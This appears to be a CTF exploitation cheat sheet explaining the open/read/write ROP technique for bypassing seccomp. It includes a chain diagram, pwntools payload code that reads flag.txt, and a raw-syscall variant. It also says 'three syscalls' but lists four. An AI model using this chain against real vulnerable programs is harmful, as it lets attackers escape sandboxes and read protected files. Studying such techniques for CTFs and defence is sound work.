# ORW ROP

**When:** `execve`/`system` are blocked by seccomp, but open/read/write are allowed. You need to read a file (flag) and print it.

**Prerequisites:**

- PLT entries or syscall gadget for `open`, `read`, `write`
- A writable buffer (BSS) for the filename
- `pop rdi`, `pop rsi`, `pop rdx` gadgets

## How it works

Three syscalls in sequence:

1. `read(0, bss, 0x20)` - read filename from stdin into BSS (avoids hardcoding)
2. `open(bss, O_RDONLY)` - open the file (returns fd 3)
3. `read(3, bss+0x100, 0x100)` - read file content
4. `write(1, bss+0x100, 0x100)` - write content to stdout

```
ROP chain:
+------------------+
| pop_rdi; ret     |  <- 0 (stdin)
+------------------+
| pop_rsi; ret     |  <- BSS address
+------------------+
| pop_rdx; ret     |  <- 0x20
+------------------+
| read@PLT         |  <- read(0, bss, 0x20)
+------------------+
| pop_rdi; ret     |  <- BSS (filename)
+------------------+
| pop_rsi; ret     |  <- 0 (O_RDONLY)
+------------------+
| open@PLT         |  <- open(bss, 0) -> fd 3
+------------------+
| pop_rdi; ret     |  <- 3 (fd from open)
+------------------+
| pop_rsi; ret     |  <- BSS + 0x100 (read buffer)
+------------------+
| pop_rdx; ret     |  <- 0x100 (count)
+------------------+
| read@PLT         |  <- read(3, bss+0x100, 0x100)
+------------------+
| pop_rdi; ret     |  <- 1 (stdout)
+------------------+
| pop_rsi; ret     |  <- BSS + 0x100
+------------------+
| pop_rdx; ret     |  <- 0x100
+------------------+
| write@PLT        |  <- write(1, bss+0x100, 0x100)
+------------------+
```

## Code

```python
bss = e.bss(0x800)                # use an offset into BSS to avoid overlap
payload = flat({offset: [
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, 0x20,
    e.plt['read'],                # read(0, bss, 0x20)
    pop_rdi, bss,
    pop_rsi, 0,
    e.plt['open'],                # open(bss, 0) => fd 3
    pop_rdi, 3,
    pop_rsi, bss+0x100,
    pop_rdx, 0x100,
    e.plt['read'],                # read(3, bss+0x100, 0x100)
    pop_rdi, 1,
    pop_rsi, bss+0x100,
    pop_rdx, 0x100,
    e.plt['write'],               # write(1, bss+0x100, 0x100)
]})
io.sendline(payload)
io.send(b'flag.txt\x00')          # filename for the first read
```

## Variations

If no PLT for these functions, use syscall gadgets directly:

```python
# syscall chain using pop rax for syscall numbers
# open = 2, read = 0, write = 1
payload = flat([
    pop_rax, 2,        # SYS_open
    pop_rdi, bss,      # filename
    pop_rsi, 0,        # flags
    syscall_ret,       # open(filename, 0)
    ...
])
```

If `pop rdx` is missing, chain via ret2csu which sets all three args.
